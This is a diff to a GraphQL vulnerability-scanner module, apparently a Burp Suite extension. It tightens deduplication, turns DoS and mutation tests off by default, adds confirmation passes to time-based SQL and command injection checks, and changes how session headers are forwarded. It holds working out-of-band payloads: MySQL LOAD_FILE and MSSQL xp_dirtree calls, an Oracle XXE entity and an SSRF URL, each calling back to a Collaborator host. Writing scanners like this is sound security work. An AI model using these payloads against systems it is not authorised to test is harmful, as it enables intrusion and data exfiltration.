@@ -9,6 +9,7 @@ import com.omnistrike.framework.CollaboratorManager;
 import com.omnistrike.framework.DeduplicationStore;
 import com.omnistrike.framework.FindingsStore;
 import com.omnistrike.framework.ResponseGuard;
+import com.omnistrike.framework.ScanTargetIdentity;
 import com.omnistrike.framework.TimingLock;
 
 import com.omnistrike.model.*;
@@ -233,8 +234,9 @@ public class GraphqlTool implements ScanModule {
         }
 
         if ((pathMatch || bodyMatch) && (responseMatch || requestResponse.response() == null)) {
-            String endpointKey = host + path;
-            if (!dedup.markIfNew(MODULE_ID, host, path)) return Collections.emptyList();
+            String endpointKey = com.omnistrike.framework.ScanTargetIdentity.build(
+                    url, request.method(), "endpoint", "");
+            if (!dedup.markIfNewRaw(MODULE_ID + ":" + endpointKey)) return Collections.emptyList();
             if (detectedEndpoints.putIfAbsent(endpointKey, Boolean.TRUE) == null) {
                 api.logging().logToOutput("[GraphQL] Detected endpoint: " + url);
 
@@ -292,7 +294,7 @@ public class GraphqlTool implements ScanModule {
         if (config.getBool("graphql.securityTests.enabled", true)) {
 
             // ---- 5. DoS & Resource Abuse ----
-            if (config.getBool("graphql.dos.enabled", true)) {
+            if (config.getBool("graphql.dos.enabled", false)) {
                 testBatchQuery(originalRequest, path, url);
                 checkInterrupted();
                 testDeepNesting(originalRequest, path, url);
@@ -334,7 +336,7 @@ public class GraphqlTool implements ScanModule {
             checkInterrupted();
 
             // CSRF on mutations
-            if (schema != null) {
+            if (schema != null && config.getBool("graphql.mutations.enabled", false)) {
                 testCsrfOnMutations(originalRequest, path, url, schema);
             }
         }
@@ -440,7 +442,8 @@ public class GraphqlTool implements ScanModule {
         String getUrl = path + "?query=" + encodedQuery;
         HttpRequest getReq = HttpRequest.httpRequest(originalRequest.httpService(),
                 "GET " + getUrl + " HTTP/1.1\r\n"
-                        + "Host: " + originalRequest.httpService().host() + "\r\n"
+                        + "Host: " + hostHeaderValue(originalRequest) + "\r\n"
+                        + forwardedSessionHeaders(originalRequest, true)
                         + "Accept: application/json\r\n\r\n");
 
         HttpRequestResponse getResult = guardedSendRequest(getReq);
@@ -480,11 +483,13 @@ public class GraphqlTool implements ScanModule {
         String host = originalRequest.httpService().host();
         for (String idePath : IDE_PATHS) {
             checkInterrupted();
-            if (!dedup.markIfNew(MODULE_ID, host, "ide:" + idePath)) continue;
+            String ideKey = ScanTargetIdentity.build(originalRequest.url(), "GET", "ide", idePath);
+            if (!dedup.markIfNew(MODULE_ID, ideKey, "ide:" + idePath)) continue;
 
             HttpRequest req = HttpRequest.httpRequest(originalRequest.httpService(),
                     "GET " + idePath + " HTTP/1.1\r\n"
-                            + "Host: " + host + "\r\n"
+                            + "Host: " + hostHeaderValue(originalRequest) + "\r\n"
+                            + forwardedSessionHeaders(originalRequest, true)
                             + "Accept: text/html,application/json\r\n\r\n");
 
             HttpRequestResponse result = guardedSendRequest(req);
@@ -514,7 +519,7 @@ public class GraphqlTool implements ScanModule {
     }
 
     private void testFieldSuggestion(HttpRequest originalRequest, String path, String url) throws InterruptedException {
-        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "fieldsugg")) return;
+        if (!dedup.markIfNew(MODULE_ID, url, "fieldsugg")) return;
 
         // Test multiple misspelled fields to trigger suggestions
         String[] probes = {
@@ -707,7 +712,7 @@ public class GraphqlTool implements ScanModule {
         for (InjectableArg arg : args) {
             checkInterrupted();
             String dedupKey = "inject:" + arg.parentType + "." + arg.fieldName + "." + arg.argName;
-            if (!dedup.markIfNew(MODULE_ID, extractPath(url), dedupKey)) continue;
+            if (!dedup.markIfNew(MODULE_ID, url, dedupKey)) continue;
 
             // SQLi
             if (config.getBool("graphql.injection.sqli.enabled", true)) {
@@ -798,6 +803,7 @@ public class GraphqlTool implements ScanModule {
         }
 
         // Pass 2: Time-based payloads (serialized via TimingLock)
+        if (!TimingLock.isEnabled()) return;
         try {
             TimingLock.acquire();
             for (String[] payloadInfo : SQLI_PAYLOADS) {
@@ -831,7 +837,8 @@ public class GraphqlTool implements ScanModule {
                         HttpRequestResponse timingBaseline = guardedSendRequest(buildGqlRequest(originalRequest, path,
                                 new Gson().toJson(Map.of("query", buildQueryForArg(arg, "test123")))));
                         measuredBaselineTime = System.currentTimeMillis() - bstart;
-                        if (timingBaseline != null && !ResponseGuard.isTimingTrustworthy(timingBaseline)) continue;
+                        if (timingBaseline == null || timingBaseline.response() == null
+                                || !ResponseGuard.isTimingTrustworthy(timingBaseline)) continue;
                     } catch (Exception ignored) {}
 
                     if (elapsed > measuredBaselineTime + 14000) {
@@ -847,10 +854,18 @@ public class GraphqlTool implements ScanModule {
                         HttpRequestResponse falseResult = guardedSendRequest(falseReq);
                         long falseElapsed = System.currentTimeMillis() - fstart;
                         perHostDelay();
-                        if (falseResult != null && !ResponseGuard.isTimingTrustworthy(falseResult)) continue;
+                        if (falseResult == null || falseResult.response() == null
+                                || !ResponseGuard.isTimingTrustworthy(falseResult)) continue;
 
                         // False condition must NOT delay (within baseline + 5s tolerance)
                         if (falseElapsed < measuredBaselineTime + 5000) {
+                            long confirmStart = System.currentTimeMillis();
+                            HttpRequestResponse confirmResult = guardedSendRequest(req);
+                            long confirmElapsed = System.currentTimeMillis() - confirmStart;
+                            perHostDelay();
+                            if (confirmResult == null || confirmResult.response() == null
+                                    || !ResponseGuard.isTimingTrustworthy(confirmResult)
+                                    || confirmElapsed <= measuredBaselineTime + 14000) continue;
                             findingsStore.addFinding(Finding.builder(MODULE_ID,
                                             "GraphQL SQL Injection (Time-Based) via " + arg.argName,
                                             Severity.HIGH, Confidence.CERTAIN)
@@ -858,7 +873,8 @@ public class GraphqlTool implements ScanModule {
                                     .parameter(arg.parentType + "." + arg.fieldName + "." + arg.argName)
                                     .evidence("Technique: " + technique + " | Payload: " + payload
                                             + " | True condition: " + elapsed + "ms | False condition: "
-                                            + falseElapsed + "ms | Baseline: " + measuredBaselineTime + "ms")
+                                            + falseElapsed + "ms | Confirm: " + confirmElapsed
+                                            + "ms | Baseline: " + measuredBaselineTime + "ms")
                                     .description("Time-based SQL injection confirmed in GraphQL argument '" + arg.argName
                                             + "'. True condition delayed " + (elapsed / 1000) + "s while false condition "
                                             + "returned in " + falseElapsed + "ms.")
@@ -980,6 +996,7 @@ public class GraphqlTool implements ScanModule {
         }
 
         // Pass 2: Time-based payloads (serialized via TimingLock)
+        if (!TimingLock.isEnabled()) return;
         try {
             TimingLock.acquire();
             for (String[] payloadInfo : CMDI_PAYLOADS) {
@@ -1016,7 +1033,8 @@ public class GraphqlTool implements ScanModule {
                         HttpRequestResponse timingBaseline = guardedSendRequest(buildGqlRequest(originalRequest, path,
                                 new Gson().toJson(Map.of("query", buildQueryForArg(arg, "test123")))));
                         measuredBaselineTime = System.currentTimeMillis() - bstart;
-                        if (timingBaseline != null && !ResponseGuard.isTimingTrustworthy(timingBaseline)) continue;
+                        if (timingBaseline == null || timingBaseline.response() == null
+                                || !ResponseGuard.isTimingTrustworthy(timingBaseline)) continue;
                     } catch (Exception ignored) {}
 
                     if (elapsed > measuredBaselineTime + 14000) {
@@ -1031,10 +1049,18 @@ public class GraphqlTool implements ScanModule {
                         HttpRequestResponse falseResult = guardedSendRequest(falseReq);
                         long falseElapsed = System.currentTimeMillis() - fstart;
                         perHostDelay();
-                        if (falseResult != null && !ResponseGuard.isTimingTrustworthy(falseResult)) continue;
+                        if (falseResult == null || falseResult.response() == null
+                                || !ResponseGuard.isTimingTrustworthy(falseResult)) continue;
 
                         // False condition must NOT delay (within baseline + 5s tolerance)
                         if (falseElapsed < measuredBaselineTime + 5000) {
+                            long confirmStart = System.currentTimeMillis();
+                            HttpRequestResponse confirmResult = guardedSendRequest(req);
+                            long confirmElapsed = System.currentTimeMillis() - confirmStart;
+                            perHostDelay();
+                            if (confirmResult == null || confirmResult.response() == null
+                                    || !ResponseGuard.isTimingTrustworthy(confirmResult)
+                                    || confirmElapsed <= measuredBaselineTime + 14000) continue;
                             findingsStore.addFinding(Finding.builder(MODULE_ID,
                                             "GraphQL OS Command Injection (Time-Based) via " + arg.argName,
                                             Severity.HIGH, Confidence.CERTAIN)
@@ -1042,7 +1068,8 @@ public class GraphqlTool implements ScanModule {
                                     .parameter(arg.parentType + "." + arg.fieldName + "." + arg.argName)
                                     .evidence("Technique: " + technique + " | Payload: " + payload
                                             + " | True condition: " + elapsed + "ms | False condition: "
-                                            + falseElapsed + "ms | Baseline: " + measuredBaselineTime + "ms")
+                                            + falseElapsed + "ms | Confirm: " + confirmElapsed
+                                            + "ms | Baseline: " + measuredBaselineTime + "ms")
                                     .description("Time-based command injection confirmed in GraphQL argument '"
                                             + arg.argName + "'. True condition delayed " + (elapsed / 1000)
                                             + "s while false condition returned in " + falseElapsed + "ms.")
@@ -1158,12 +1185,11 @@ public class GraphqlTool implements ScanModule {
     }
 
     private void testOobOnArg(HttpRequest originalRequest, String path, String url, InjectableArg arg) throws InterruptedException {
-        AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
         String argPath = arg.parentType + "." + arg.fieldName + "." + arg.argName;
 
         // OOB SQLi (DNS exfil)
         String[][] oobSqlPayloads = {
-                {"' AND 1=1 UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.COLLAB\\\\a'))--", "MySQL OOB DNS"},
+                {"' AND 1=1 UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\','COLLAB','\\\\a'))--", "MySQL OOB DNS"},
                 {"'; EXEC master..xp_dirtree '\\\\COLLAB\\a'--", "MSSQL OOB xp_dirtree"},
                 {"'||(SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://COLLAB/\">%remote;]>'),'/l') FROM dual)||'", "Oracle OOB XXE"},
         };
@@ -1172,6 +1198,8 @@ public class GraphqlTool implements ScanModule {
             checkInterrupted();
             String payloadTemplate = payloadInfo[0];
             String technique = payloadInfo[1];
+            AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
+            AtomicReference<String> sentPayload = new AtomicReference<>();
 
             String collabPayload = collaboratorManager.generatePayload(
                     MODULE_ID, url, argPath,
@@ -1194,13 +1222,14 @@ public class GraphqlTool implements ScanModule {
                                 .description("Out-of-band SQL injection confirmed in GraphQL argument '"
                                         + arg.argName + "' via Burp Collaborator callback.")
                                 .requestResponse(sentRequest.get())  // may be null if callback fires before set() — finding is still reported
-                                .payload(payloadTemplate)
+                                .payload(sentPayload.get())
                                 .build());
                     }
             );
             if (collabPayload == null) continue;
 
             String payload = payloadTemplate.replace("COLLAB", collabPayload);
+            sentPayload.set(payload);
             String query = buildQueryForArg(arg, payload);
             String body = new Gson().toJson(Map.of("query", query));
             HttpRequest req = buildGqlRequest(originalRequest, path, body);
@@ -1213,6 +1242,8 @@ public class GraphqlTool implements ScanModule {
                 || arg.argName.toLowerCase().contains("link") || arg.argName.toLowerCase().contains("href")
                 || arg.argName.toLowerCase().contains("endpoint") || arg.argName.toLowerCase().contains("callback")) {
 
+            AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
+            AtomicReference<String> ssrfPayload = new AtomicReference<>();
             String collabPayload = collaboratorManager.generatePayload(
                     MODULE_ID, url, argPath,
                     "GraphQL SSRF OOB via " + arg.argName,
@@ -1231,12 +1262,13 @@ public class GraphqlTool implements ScanModule {
                                 .description("SSRF confirmed in GraphQL argument '" + arg.argName
                                         + "'. The server made an outbound request to the Collaborator payload.")
                                 .requestResponse(sentRequest.get())  // may be null if callback fires before set() — finding is still reported
-                                .payload("GraphQL SSRF OOB via " + arg.argName)
+                                .payload(ssrfPayload.get())
                                 .build());
                     }
             );
             if (collabPayload != null) {
                 String payload = "http://" + collabPayload + "/graphql-ssrf";
+                ssrfPayload.set(payload);
                 String query = buildQueryForArg(arg, payload);
                 String body = new Gson().toJson(Map.of("query", query));
                 HttpRequest req = buildGqlRequest(originalRequest, path, body);
@@ -1280,7 +1312,7 @@ public class GraphqlTool implements ScanModule {
                                 && ("ID".equals(argTypeName) || "Int".equals(argTypeName) || "String".equals(argTypeName))) {
 
                             String dedupKey = "idor:" + fieldName + "." + argName;
-                            if (!dedup.markIfNew(MODULE_ID, extractPath(url), dedupKey)) continue;
+                            if (!dedup.markIfNew(MODULE_ID, url, dedupKey)) continue;
 
                             testIdorOnField(originalRequest, path, url, fieldName, argName, argTypeName,
                                     field.getAsJsonObject("type"), schema, maxIds);
@@ -1351,7 +1383,7 @@ public class GraphqlTool implements ScanModule {
     // ==================== 5. DOS & RESOURCE ABUSE ====================
 
     private void testBatchQuery(HttpRequest originalRequest, String path, String url) throws InterruptedException {
-        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "batch")) return;
+        if (!dedup.markIfNew(MODULE_ID, url, "batch")) return;
 
         JsonArray batch = new JsonArray();
         for (int i = 0; i < 10; i++) {
@@ -1385,7 +1417,7 @@ public class GraphqlTool implements ScanModule {
     }
 
     private void testDeepNesting(HttpRequest originalRequest, String path, String url) throws InterruptedException {
-        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "deepnest")) return;
+        if (!dedup.markIfNew(MODULE_ID, url, "deepnest")) return;
 
         String deepQuery = "{ __schema { types { fields { type { fields { type { fields { type { name } } } } } } } } }";
         String body = new Gson().toJson(Map.of("query", deepQuery));
@@ -1411,7 +1443,7 @@ public class GraphqlTool implements ScanModule {
     }
 
     private void testAliasDos(HttpRequest originalRequest, String path, String url) throws InterruptedException {
-        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "aliasdos")) return;
+        if (!dedup.markIfNew(MODULE_ID, url, "aliasdos")) return;
 
         StringBuilder sb = new StringBuilder("{ ");
         for (int i = 0; i < 100; i++) {
@@ -1444,7 +1476,7 @@ public class GraphqlTool implements ScanModule {
     }
 
     private void testCircularFragments(HttpRequest originalRequest, String path, String url) throws InterruptedException {
-        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "circfrag")) return;
+        if (!dedup.markIfNew(MODULE_ID, url, "circfrag")) return;
 
         // Circular fragment spread test
         String query = "query { __typename ...A } fragment A on Query { __typename ...B } fragment B on Query { __typename ...A }";
@@ -1475,7 +1507,7 @@ public class GraphqlTool implements ScanModule {
     }
 
     private void testDirectiveOverloading(HttpRequest originalRequest, String path, String url) throws InterruptedException {
-        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "directiveoverload")) return;
+        if (!dedup.markIfNew(MODULE_ID, url, "directiveoverload")) return;
 
         // Build a query with many @skip/@include directives
         StringBuilder sb = new StringBuilder("{ __typename ");
@@ -1510,14 +1542,15 @@ public class GraphqlTool implements ScanModule {
     // ==================== 6. HTTP-LEVEL TESTS ====================
 
     private void testGetMethodQuery(HttpRequest originalRequest, String path, String url) throws InterruptedException {
-        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "getmethod")) return;
+        if (!dedup.markIfNew(MODULE_ID, url, "getmethod")) return;
 
         String encodedQuery = URLEncoder.encode("{ __typename }", StandardCharsets.UTF_8);
         String getUrl = path + "?query=" + encodedQuery;
 
         HttpRequest req = HttpRequest.httpRequest(originalRequest.httpService(),
                 "GET " + getUrl + " HTTP/1.1\r\n"
-                        + "Host: " + originalRequest.httpService().host() + "\r\n"
+                        + "Host: " + hostHeaderValue(originalRequest) + "\r\n"
+                        + forwardedSessionHeaders(originalRequest, true)
                         + "Accept: application/json\r\n\r\n");
 
         HttpRequestResponse result = guardedSendRequest(req);
@@ -1525,7 +1558,7 @@ public class GraphqlTool implements ScanModule {
 
         if (result != null && result.response() != null && result.response().statusCode() == 200) {
             String respBody = result.response().bodyToString();
-            if (respBody != null && respBody.contains("__typename")) {
+            if (hasGraphqlDataField(respBody, "__typename")) {
                 findingsStore.addFinding(Finding.builder(MODULE_ID,
                                 "GraphQL Queries Accepted via GET Method",
                                 Severity.INFO, Confidence.CERTAIN)
@@ -1544,14 +1577,15 @@ public class GraphqlTool implements ScanModule {
     }
 
     private void testContentTypeBypass(HttpRequest originalRequest, String path, String url) throws InterruptedException {
-        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "ctbypass")) return;
+        if (!dedup.markIfNew(MODULE_ID, url, "ctbypass")) return;
 
         // Try sending GraphQL query as form-urlencoded
         String formBody = "query=" + URLEncoder.encode("{ __typename }", StandardCharsets.UTF_8);
 
         HttpRequest req = HttpRequest.httpRequest(originalRequest.httpService(),
                 "POST " + path + " HTTP/1.1\r\n"
-                        + "Host: " + originalRequest.httpService().host() + "\r\n"
+                        + "Host: " + hostHeaderValue(originalRequest) + "\r\n"
+                        + forwardedSessionHeaders(originalRequest, true)
                         + "Content-Type: application/x-www-form-urlencoded\r\n"
                         + "Content-Length: " + formBody.getBytes(java.nio.charset.StandardCharsets.UTF_8).length + "\r\n\r\n"
                         + formBody);
@@ -1561,7 +1595,7 @@ public class GraphqlTool implements ScanModule {
 
         if (result != null && result.response() != null && result.response().statusCode() == 200) {
             String respBody = result.response().bodyToString();
-            if (respBody != null && respBody.contains("__typename")) {
+            if (hasGraphqlDataField(respBody, "__typename")) {
                 findingsStore.addFinding(Finding.builder(MODULE_ID,
                                 "GraphQL Accepts Form URL-Encoded Content-Type",
                                 Severity.INFO, Confidence.CERTAIN)
@@ -1580,7 +1614,13 @@ public class GraphqlTool implements ScanModule {
     }
 
     private void testCsrfOnMutations(HttpRequest originalRequest, String path, String url, JsonObject schema) throws InterruptedException {
-        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "csrf")) return;
+        if (!dedup.markIfNew(MODULE_ID, url, "csrf")) return;
+
+        // CSRF is meaningful only for ambient cookie authentication.  Forwarding
+        // Authorization or CSRF-token headers would simulate a request a hostile
+        // origin cannot normally make and creates false positives.
+        String sessionCookie = originalRequest.headerValue("Cookie");
+        if (sessionCookie == null || sessionCookie.isBlank()) return;
 
         // Need a mutation type to test
         if (!schema.has("mutationType") || schema.get("mutationType").isJsonNull()) return;
@@ -1607,7 +1647,8 @@ public class GraphqlTool implements ScanModule {
 
         HttpRequest req = HttpRequest.httpRequest(originalRequest.httpService(),
                 "POST " + path + " HTTP/1.1\r\n"
-                        + "Host: " + originalRequest.httpService().host() + "\r\n"
+                        + "Host: " + hostHeaderValue(originalRequest) + "\r\n"
+                        + "Cookie: " + sessionCookie + "\r\n"
                         + "Content-Type: application/json\r\n"
                         + "Content-Length: " + body.getBytes(java.nio.charset.StandardCharsets.UTF_8).length + "\r\n\r\n"
                         + body);
@@ -1619,8 +1660,7 @@ public class GraphqlTool implements ScanModule {
             int status = result.response().statusCode();
             String respBody = result.response().bodyToString();
             // If mutation was processed (not rejected for CSRF)
-            if (status == 200 && respBody != null && !respBody.contains("CSRF")
-                    && !respBody.contains("csrf") && !respBody.contains("forbidden")) {
+            if (status == 200 && graphqlMutationSucceeded(respBody, testMutation)) {
                 findingsStore.addFinding(Finding.builder(MODULE_ID,
                                 "GraphQL Mutations Accept Requests Without Origin Header",
                                 Severity.INFO, Confidence.TENTATIVE)
@@ -1642,7 +1682,7 @@ public class GraphqlTool implements ScanModule {
     // ==================== 7. ERROR & INFO DISCLOSURE ====================
 
     private void testVerboseErrors(HttpRequest originalRequest, String path, String url) throws InterruptedException {
-        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "verboserr")) return;
+        if (!dedup.markIfNew(MODULE_ID, url, "verboserr")) return;
 
         // Send deliberately malformed queries
         String[] malformed = {
@@ -1696,7 +1736,7 @@ public class GraphqlTool implements ScanModule {
     }
 
     private void testDebugMode(HttpRequest originalRequest, String path, String url) throws InterruptedException {
-        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "debug")) return;
+        if (!dedup.markIfNew(MODULE_ID, url, "debug")) return;
 
         String query = "{ __typename }";
         String body = new Gson().toJson(Map.of("query", query));
@@ -1742,7 +1782,7 @@ public class GraphqlTool implements ScanModule {
     }
 
     private void testFrameworkFingerprint(HttpRequest originalRequest, String path, String url) throws InterruptedException {
-        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "fingerprint")) return;
+        if (!dedup.markIfNew(MODULE_ID, url, "fingerprint")) return;
 
         // Collect responses from a normal query and a bad query
         String goodBody = new Gson().toJson(Map.of("query", "{ __typename }"));
@@ -1801,7 +1841,9 @@ public class GraphqlTool implements ScanModule {
     private List<InjectableArg> extractInjectableArgs(JsonObject schema) {
         List<InjectableArg> args = new ArrayList<>();
         extractArgsFromRootType(schema, "queryType", args);
-        extractArgsFromRootType(schema, "mutationType", args);
+        if (config.getBool("graphql.mutations.enabled", false)) {
+            extractArgsFromRootType(schema, "mutationType", args);
+        }
         return args;
     }
 
@@ -2100,23 +2142,47 @@ public class GraphqlTool implements ScanModule {
     private HttpRequest buildGqlRequest(HttpRequest originalRequest, String path, String jsonBody) {
         StringBuilder headers = new StringBuilder();
         headers.append("POST ").append(path).append(" HTTP/1.1\r\n");
-        headers.append("Host: ").append(originalRequest.httpService().host()).append("\r\n");
+        headers.append("Host: ").append(hostHeaderValue(originalRequest)).append("\r\n");
+        headers.append(forwardedSessionHeaders(originalRequest, true));
         headers.append("Content-Type: application/json\r\n");
         headers.append("Content-Length: ").append(jsonBody.getBytes(java.nio.charset.StandardCharsets.UTF_8).length).append("\r\n");
-
-        // Carry over cookies and authorization from original request
-        for (var h : originalRequest.headers()) {
-            String name = h.name().toLowerCase();
-            if (name.equals("cookie") || name.equals("authorization")
-                    || name.equals("x-csrf-token") || name.equals("x-xsrf-token")) {
-                headers.append(h.name()).append(": ").append(h.value()).append("\r\n");
-            }
-        }
 
         headers.append("\r\n");
         headers.append(jsonBody);
 
         return HttpRequest.httpRequest(originalRequest.httpService(), headers.toString());
+    }
+
+    private static String hostHeaderValue(HttpRequest request) {
+        String original = request.headerValue("Host");
+        return original == null || original.isBlank() ? request.httpService().host() : original;
+    }
+
+    private static String forwardedSessionHeaders(HttpRequest request, boolean includeCsrfTokens) {
+        StringBuilder headers = new StringBuilder();
+        for (var header : request.headers()) {
+            String name = header.name().toLowerCase(Locale.ROOT);
+            if (name.equals("cookie") || name.equals("authorization")
+                    || (includeCsrfTokens && (name.equals("x-csrf-token") || name.equals("x-xsrf-token")))) {
+                headers.append(header.name()).append(": ").append(header.value()).append("\r\n");
+            }
+        }
+        return headers.toString();
+    }
+
+    static boolean hasGraphqlDataField(String body, String field) {
+        try {
+            JsonObject root = JsonParser.parseString(body).getAsJsonObject();
+            if (root.has("errors")) return false;
+            JsonObject data = root.getAsJsonObject("data");
+            return data != null && data.has(field) && !data.get(field).isJsonNull();
+        } catch (Exception ignored) {
+            return false;
+        }
+    }
+
+    static boolean graphqlMutationSucceeded(String body, String mutationName) {
+        return hasGraphqlDataField(body, mutationName);
     }
 
     private String extractPath(String url) {
